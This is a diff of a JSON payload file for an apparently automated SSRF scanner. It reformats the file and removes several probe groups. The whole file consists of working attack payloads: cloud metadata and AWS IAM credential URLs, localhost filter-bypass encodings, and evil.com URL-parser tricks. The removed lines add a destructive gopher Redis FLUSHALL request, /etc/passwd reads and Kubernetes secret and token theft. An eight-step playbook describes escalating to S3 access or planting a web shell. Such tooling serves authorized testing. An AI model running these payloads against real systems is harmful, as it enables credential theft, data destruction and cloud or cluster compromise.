@@ -1,156 +1,44 @@
 {
   "category": "ssrf",
-  "craft_guidance": [
-    "1. IDENTIFY ENTRY POINT: URL parameters (url=, redirect=, callback=, webhook=), file imports, PDF generators, image fetchers, API integrations.",
-    "2. TEST CONNECTIVITY: Send to Collaborator first. If callback received, SSRF confirmed. If not, try blind via timing (slow internal vs fast external).",
-    "3. BYPASS FILTERS: IP blocked? Use decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 ([::1]), DNS rebinding, or redirect from your server.",
-    "4. CLOUD METADATA: AWS=169.254.169.254 (IMDSv2 needs token PUT first), GCP=metadata.google.internal, Azure=169.254.169.254 (needs Metadata:true header).",
-    "5. PROTOCOL PIVOTING: http:// blocked? Try file:// (local read), gopher:// (Redis/SMTP), dict:// (port scan), ftp://, ldap://.",
-    "6. ESCALATION: Metadata creds -> AWS CLI -> S3/RDS access. Redis -> write web shell or SSH key. Elasticsearch -> dump indices. Internal admin panels -> further exploitation.",
-    "7. BLIND DETECTION: No response body? Use DNS (Collaborator), timing (internal=slow, external=fast), or error differences (connection refused vs timeout vs success).",
-    "8. REDIRECT CHAIN: Target fetches your server -> 302 redirect to internal IP. Bypasses hostname-based filters that only check initial URL."
-  ],
+  "description": " (core: cloud-metadata / internal / url-bypass / redirect)",
   "contexts": {
-    "internal": {
-      "description": "SSRF probes targeting internal network resources and localhost services",
-      "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
-      "probes": [
-        {
-          "payload": "http://127.0.0.1/",
-          "description": "SSRF to localhost root \u2014 length diff indicates internal content served",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100}
-          ],
-          "severity": "high",
-          "confidence_boost": 40,
-          "variables": {}
-        },
-        {
-          "payload": "http://127.0.0.1:22/",
-          "description": "SSRF to localhost SSH port \u2014 SSH banner in response confirms internal reach",
-          "matchers": [
-            {"type": "word", "words": ["ssh", "refused", "OpenSSH"], "condition": "or"}
-          ],
-          "severity": "high",
-          "confidence_boost": 65,
-          "variables": {}
-        },
-        {
-          "payload": "http://127.0.0.1:6379/",
-          "description": "SSRF to localhost Redis \u2014 Redis error banner confirms internal reach",
-          "matchers": [
-            {"type": "word", "words": ["-ERR", "NOAUTH", "redis"], "condition": "or"}
-          ],
-          "severity": "critical",
-          "confidence_boost": 75,
-          "variables": {}
-        },
-        {
-          "payload": "http://0.0.0.0/",
-          "description": "SSRF via 0.0.0.0 alias for localhost bypass",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100}
-          ],
-          "severity": "high",
-          "confidence_boost": 35,
-          "variables": {}
-        },
-        {
-          "payload": "{{callback}}",
-          "description": "Out-of-band SSRF detection via collaborator callback URL",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 0}
-          ],
-          "severity": "high",
-          "confidence_boost": 50,
-          "variables": {}
-        }
-      ]
-    },
-    "localhost_bypass": {
-      "description": "SSRF localhost bypass probes \u2014 alternative IP representations that resolve to 127.0.0.1 but evade string-based blocklists",
-      "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
-      "probes": [
-        {
-          "payload": "http://127.1/",
-          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 50,
-          "variables": {}
-        },
-        {
-          "payload": "http://0177.0.0.1/",
-          "description": "Octal notation for 127.0.0.1 \u2014 0177 = 127 in octal; many URL parsers resolve this to localhost",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "http://0x7f.0.0.1/",
-          "description": "Hex notation for 127.0.0.1 \u2014 0x7f = 127 in hex; bypasses decimal IP blocklists",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "http://2130706433/",
-          "description": "Decimal integer notation for 127.0.0.1 \u2014 2130706433 = 0x7F000001; evades dotted-quad filters entirely",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "http://[::1]/",
-          "description": "IPv6 loopback address \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "http://0/",
-          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 100},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 45,
-          "variables": {}
-        }
-      ]
-    },
     "cloud_metadata": {
       "description": "SSRF probes targeting cloud provider metadata endpoints (AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba)",
-      "tech_match": ["AWS", "GCP", "Azure"],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "tech_match": [
+        "AWS",
+        "GCP",
+        "Azure"
+      ],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
       "probes": [
         {
           "payload": "http://169.254.169.254/latest/meta-data/",
           "description": "AWS IMDSv1 metadata endpoint \u2014 ami-id or instance-id confirms SSRF to AWS metadata",
           "matchers": [
-            {"type": "word", "words": ["ami-id", "instance-id", "iam"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 90,
@@ -160,7 +48,10 @@
           "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
           "description": "AWS IAM credentials endpoint \u2014 role name in response reveals attached IAM role",
           "matchers": [
-            {"type": "regex", "pattern": "[A-Za-z0-9_-]{1,64}"}
+            {
+              "type": "regex",
+              "pattern": "[A-Za-z0-9_-]{1,64}"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -170,7 +61,14 @@
           "payload": "http://metadata.google.internal/computeMetadata/v1/",
           "description": "GCP metadata endpoint \u2014 requires Metadata-Flavor header bypass",
           "matchers": [
-            {"type": "word", "words": ["instance", "project"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "instance",
+                "project"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 80,
@@ -180,7 +78,15 @@
           "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
           "description": "Azure IMDS endpoint \u2014 compute details confirm Azure SSRF",
           "matchers": [
-            {"type": "word", "words": ["subscriptionId", "resourceGroupName", "vmId"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "subscriptionId",
+                "resourceGroupName",
+                "vmId"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -190,7 +96,16 @@
           "payload": "http://169.254.169.254/metadata/v1.json",
           "description": "DigitalOcean metadata endpoint \u2014 droplet_id or region in response confirms SSRF to DO metadata",
           "matchers": [
-            {"type": "word", "words": ["droplet_id", "region", "interfaces", "floating_ip"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "droplet_id",
+                "region",
+                "interfaces",
+                "floating_ip"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -200,7 +115,16 @@
           "payload": "http://169.254.169.254/opc/v1/instance/",
           "description": "Oracle Cloud IMDS endpoint \u2014 compartmentId or shape in response confirms SSRF to OCI metadata",
           "matchers": [
-            {"type": "word", "words": ["compartmentId", "shape", "availabilityDomain", "ocid1"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "compartmentId",
+                "shape",
+                "availabilityDomain",
+                "ocid1"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -210,7 +134,16 @@
           "payload": "http://100.100.100.200/latest/meta-data/",
           "description": "Alibaba Cloud ECS metadata endpoint \u2014 instance-id or region-id confirms SSRF to Alibaba Cloud metadata",
           "matchers": [
-            {"type": "word", "words": ["instance-id", "region-id", "zone-id", "image-id"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "instance-id",
+                "region-id",
+                "zone-id",
+                "image-id"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -218,39 +151,99 @@
         }
       ]
     },
-    "ipv6_bypass": {
-      "description": "SSRF bypass using IPv6 representations of localhost \u2014 evades blocklists checking for 127.0.0.1 in string form",
+    "internal": {
+      "description": "SSRF probes targeting internal network resources and localhost services",
       "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
       "probes": [
         {
-          "payload": "http://[::ffff:127.0.0.1]/",
-          "description": "IPv4-mapped IPv6 address for localhost \u2014 bypasses simple string match on 127.0.0.1",
+          "payload": "http://127.0.0.1/",
+          "description": "SSRF to localhost root \u2014 length diff indicates internal content served",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
-          "confidence_boost": 50,
+          "confidence_boost": 40,
           "variables": {}
         },
         {
-          "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
-          "description": "Full-form IPv4-mapped IPv6 localhost \u2014 alternative notation evading short-form filters",
+          "payload": "http://127.0.0.1:22/",
+          "description": "SSRF to localhost SSH port \u2014 SSH banner in response confirms internal reach",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "word",
+              "words": [
+                "ssh",
+                "refused",
+                "OpenSSH"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
-          "confidence_boost": 50,
+          "confidence_boost": 65,
           "variables": {}
         },
         {
-          "payload": "http://[::1]/",
-          "description": "IPv6 loopback address (::1) \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
+          "payload": "http://127.0.0.1:6379/",
+          "description": "SSRF to localhost Redis \u2014 Redis error banner confirms internal reach",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "word",
+              "words": [
+                "-ERR",
+                "NOAUTH",
+                "redis"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "http://0.0.0.0/",
+          "description": "SSRF via 0.0.0.0 alias for localhost bypass",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
-          "confidence_boost": 55,
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{callback}}",
+          "description": "Out-of-band SSRF detection via collaborator callback URL",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 0
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
           "variables": {}
         }
       ]
@@ -258,13 +251,31 @@
     "url_bypass": {
       "description": "SSRF filter bypass via URL parsing ambiguities \u2014 at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
       "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
       "probes": [
         {
           "payload": "http://127.0.0.1@evil.com/",
           "description": "At-sign URL parsing trick \u2014 some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -274,7 +285,10 @@
           "payload": "http://evil.com#@127.0.0.1/",
           "description": "Fragment bypass \u2014 some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 40,
@@ -284,7 +298,10 @@
           "payload": "http://127.1/",
           "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -294,7 +311,10 @@
           "payload": "http://0/",
           "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -304,7 +324,10 @@
           "payload": "http://127.0.0.1:80\\@evil.com/",
           "description": "Backslash before @ trick \u2014 some URL parsers treat backslash as path separator, others as authority delimiter",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 40,
@@ -312,112 +335,34 @@
         }
       ]
     },
-    "protocol_variant": {
-      "description": "SSRF via alternative protocol schemes — tests whether server-side fetchers support non-HTTP protocols that can interact with internal services",
-      "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
-      "probes": [
-        {
-          "payload": "ftp://127.0.0.1/",
-          "description": "FTP protocol SSRF — FTP banner (220, vsFTPd, ProFTPD) in response confirms server-side FTP client support",
-          "matchers": [
-            {"type": "word", "words": ["220", "vsFTPd", "ProFTPD", "FTP", "FileZilla", "Connection refused"], "condition": "or"}
-          ],
-          "severity": "high",
-          "confidence_boost": 60,
-          "variables": {}
-        },
-        {
-          "payload": "gopher://127.0.0.1:6379/_INFO%0d%0a",
-          "description": "Gopher to Redis SSRF — gopher protocol sends raw bytes to Redis; redis_version in response confirms gopher support and Redis access",
-          "matchers": [
-            {"type": "word", "words": ["redis_version", "connected_clients", "used_memory", "-ERR"], "condition": "or"}
-          ],
-          "severity": "critical",
-          "confidence_boost": 85,
-          "variables": {}
-        },
-        {
-          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
-          "description": "Gopher to Memcached SSRF — sends stats command via gopher; STAT in response confirms Memcached access",
-          "matchers": [
-            {"type": "word", "words": ["STAT", "pid", "uptime", "version", "END"], "condition": "or"}
-          ],
-          "severity": "critical",
-          "confidence_boost": 80,
-          "variables": {}
-        },
-        {
-          "payload": "ldap://127.0.0.1/",
-          "description": "LDAP protocol SSRF — LDAP error or connection message confirms server-side LDAP client support and internal reach",
-          "matchers": [
-            {"type": "word", "words": ["ldap", "LDAP", "Distinguished Name", "NamingException", "LDAPException", "connection refused"], "condition": "or"}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "dict://127.0.0.1:6379/INFO",
-          "description": "Dict protocol to Redis SSRF — dict:// sends raw command to Redis; redis_version confirms dict support and Redis access",
-          "matchers": [
-            {"type": "word", "words": ["redis_version", "connected_clients", "used_memory"], "condition": "or"}
-          ],
-          "severity": "critical",
-          "confidence_boost": 80,
-          "variables": {}
-        },
-        {
-          "payload": "file:///etc/hostname",
-          "description": "File protocol SSRF — reads local files; non-empty response with short content (hostname) confirms file:// scheme is allowed",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 2},
-            {"type": "not_word", "words": ["not allowed", "blocked", "invalid", "denied", "unsupported"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 75,
-          "variables": {}
-        }
-      ]
-    },
-    "dns_rebinding": {
-      "description": "SSRF via DNS rebinding — exploits time-of-check vs time-of-use when server validates DNS then fetches, allowing second resolution to point to internal IP",
-      "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
-      "probes": [
-        {
-          "payload": "http://{{callback}}/ssrf-rebind-check",
-          "description": "DNS rebinding baseline — send Collaborator URL to confirm server-side fetch occurs; Collaborator DNS interaction is prerequisite for rebinding attack",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 0}
-          ],
-          "severity": "medium",
-          "confidence_boost": 30,
-          "variables": {}
-        },
-        {
-          "payload": "http://0x7f000001.{{callback}}/",
-          "description": "Hex IP subdomain rebinding probe — some DNS resolvers resolve hex-encoded IPs in subdomains to 127.0.0.1; Collaborator interaction + internal content confirms rebinding",
-          "matchers": [
-            {"type": "length_diff", "min_diff": 50},
-            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        }
-      ]
-    },
     "redirect_based": {
       "description": "SSRF via open redirect chains \u2014 server fetches a URL that redirects to an internal resource",
       "tech_match": [],
-      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
       "probes": [
         {
           "payload": "https://{{callback}}/redirect?url=http://169.254.169.254/",
           "description": "SSRF via open redirect \u2014 server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
           "matchers": [
-            {"type": "length_diff", "min_diff": 0}
+            {
+              "type": "length_diff",
+              "min_diff": 0
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -427,155 +372,26 @@
           "payload": "http://169.254.169.254/latest/meta-data/hostname",
           "description": "AWS EC2 hostname metadata \u2014 short string response is high-confidence SSRF confirmation",
           "matchers": [
-            {"type": "regex", "pattern": "ip-[0-9]+-[0-9]+-[0-9]+-[0-9]+"}
+            {
+              "type": "regex",
+              "pattern": "ip-[0-9]+-[0-9]+-[0-9]+-[0-9]+"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 90,
           "variables": {}
         }
       ]
-    },
-    "protocol_smuggling": {
-      "description": "Non-HTTP URI schemes that some HTTP clients still resolve. gopher:// is the king for raw-byte cross-protocol attacks (Redis, memcached, MySQL, SMTP). Java URL.openConnection accepts ftp://, file://, jar://, netdoc:// historically. PHP allows phar://, expect://, glob://. Curl's -L follows file:// across redirects.",
-      "tech_match": ["java", "php", "curl"],
-      "param_match": ["url", "uri", "callback", "redirect", "fetch", "endpoint"],
-      "probes": [
-        {
-          "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
-          "description": "gopher:// to Redis 6379 \u2014 sends raw RESP-protocol bytes via HTTP-style fetch. flushall is destructive; replace with INFO for safety. Confirm by issuing a benign command first (Rule 5).",
-          "matchers": [
-            {"type": "word", "any": ["redis_version", "+OK", "PONG"]},
-            {"type": "timing", "min_ms": 100}
-          ],
-          "severity": "critical",
-          "confidence_boost": 70,
-          "variables": {"safety_note": "use INFO/PING, not FLUSHALL"}
-        },
-        {
-          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
-          "description": "gopher:// to memcached 11211 \u2014 STATS command. Output dumps server stats and key prefixes.",
-          "matchers": [
-            {"type": "word", "any": ["STAT pid", "STAT version", "END"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 55
-        },
-        {
-          "payload": "dict://127.0.0.1:11211/stats",
-          "description": "dict:// scheme to memcached. Curl-style libs accept dict://. Less stealthy than gopher but no encoding required.",
-          "matchers": [
-            {"type": "word", "any": ["STAT", "VERSION"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 50
-        },
-        {
-          "payload": "file:///etc/passwd",
-          "description": "file:// scheme \u2014 Java URL.openConnection, PHP file_get_contents, Python urllib accept this. /etc/passwd content confirms file read.",
-          "matchers": [
-            {"type": "word", "any": ["root:x:0:0", "daemon:"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 70
-        },
-        {
-          "payload": "jar:file:///etc/passwd!/",
-          "description": "jar: scheme on Java \u2014 file:// inside a jar URI. Some Java HTTP clients still resolve.",
-          "matchers": [
-            {"type": "word", "any": ["root:x:0:0"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 65
-        },
-        {
-          "payload": "netdoc:///etc/passwd",
-          "description": "netdoc: legacy Java scheme that resolves like file://. Many WAFs miss it.",
-          "matchers": [
-            {"type": "word", "any": ["root:x:0:0"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 60
-        },
-        {
-          "payload": "phar:///tmp/test.phar/file.txt",
-          "description": "PHP phar:// triggers unserialize on .phar metadata \u2014 distinct attack path from raw read. Useful when file_get_contents is filtered for file://.",
-          "matchers": [
-            {"type": "word", "any": ["unserialize", "phar"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 55
-        }
-      ]
-    },
-    "dns_rebinding_advanced": {
-      "description": "DNS rebinding 2024+ variants. Classic A-record TTL-0 swap is well-known; new vectors abuse SVCB/HTTPS records (RFC 9460) and WebRTC ICE candidate disclosure.",
-      "tech_match": [],
-      "param_match": ["url", "host", "callback"],
-      "probes": [
-        {
-          "payload": "http://attacker-rebind.collaborator.example/",
-          "description": "[Manual] DNS rebind: attacker domain returns public IP first, 127.0.0.1 / 169.254.169.254 second. Apps that re-resolve between TOCTOU validation and fetch hit internal target.",
-          "matchers": [
-            {"type": "word", "any": ["ami-id", "instance-identity", "iam"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 60,
-          "variables": {"manual_chain": true, "COLLAB_REQUIRED": true}
-        },
-        {
-          "payload": "{{baseline}}",
-          "description": "[Manual] SVCB / HTTPS resource records (RFC 9460): attacker DNS returns SVCB pointing at internal IP via 'ipv4hint'/'ipv6hint'. HTTP clients that prefer SVCB without re-validating get redirected internally.",
-          "matchers": [
-            {"type": "word", "any": ["169.254", "127.0.0.1", "metadata"]}
-          ],
-          "severity": "high",
-          "confidence_boost": 50,
-          "variables": {"manual_chain": true}
-        }
-      ]
-    },
-    "k8s_in_cluster_pivot": {
-      "description": "SSRF inside a Kubernetes pod has direct line-of-sight to: kubelet (10250), etcd (2379/2380), kube-apiserver (6443), service-account-token at /var/run/secrets/kubernetes.io/serviceaccount/token. Cluster-compromise primitive.",
-      "tech_match": ["kubernetes", "k8s"],
-      "param_match": ["url"],
-      "probes": [
-        {
-          "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
-          "description": "kube-apiserver via in-cluster DNS. If pod has default service account with secrets read, attacker dumps cluster secrets.",
-          "matchers": [
-            {"type": "word", "any": ["SecretList", "kind\":\"Secret", "data\":"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 75
-        },
-        {
-          "payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
-          "description": "Service-account JWT token \u2014 used to authenticate to kube-apiserver. Combine with API call to escalate.",
-          "matchers": [
-            {"type": "regex", "pattern": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\."}
-          ],
-          "severity": "critical",
-          "confidence_boost": 75
-        },
-        {
-          "payload": "https://127.0.0.1:10250/pods",
-          "description": "kubelet pods endpoint \u2014 if anonymous-auth enabled (older clusters), lists every pod on the node + container metadata.",
-          "matchers": [
-            {"type": "word", "any": ["PodList", "containerStatuses"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 70
-        },
-        {
-          "payload": "http://127.0.0.1:2379/v2/keys/?recursive=true",
-          "description": "etcd v2 API \u2014 dumps the entire cluster key/value store including all Kubernetes objects. Modern etcd uses v3 gRPC, but legacy clusters expose v2 HTTP.",
-          "matchers": [
-            {"type": "word", "any": ["nodes\":", "createdIndex"]}
-          ],
-          "severity": "critical",
-          "confidence_boost": 70
-        }
-      ]
     }
-  }
+  },
+  "craft_guidance": [
+    "1. IDENTIFY ENTRY POINT: URL parameters (url=, redirect=, callback=, webhook=), file imports, PDF generators, image fetchers, API integrations.",
+    "2. TEST CONNECTIVITY: Send to Collaborator first. If callback received, SSRF confirmed. If not, try blind via timing (slow internal vs fast external).",
+    "3. BYPASS FILTERS: IP blocked? Use decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 ([::1]), DNS rebinding, or redirect from your server.",
+    "4. CLOUD METADATA: AWS=169.254.169.254 (IMDSv2 needs token PUT first), GCP=metadata.google.internal, Azure=169.254.169.254 (needs Metadata:true header).",
+    "5. PROTOCOL PIVOTING: http:// blocked? Try file:// (local read), gopher:// (Redis/SMTP), dict:// (port scan), ftp://, ldap://.",
+    "6. ESCALATION: Metadata creds -> AWS CLI -> S3/RDS access. Redis -> write web shell or SSH key. Elasticsearch -> dump indices. Internal admin panels -> further exploitation.",
+    "7. BLIND DETECTION: No response body? Use DNS (Collaborator), timing (internal=slow, external=fast), or error differences (connection refused vs timeout vs success).",
+    "8. REDIRECT CHAIN: Target fetches your server -> 302 redirect to internal IP. Bypasses hostname-based filters that only check initial URL."
+  ]
 }
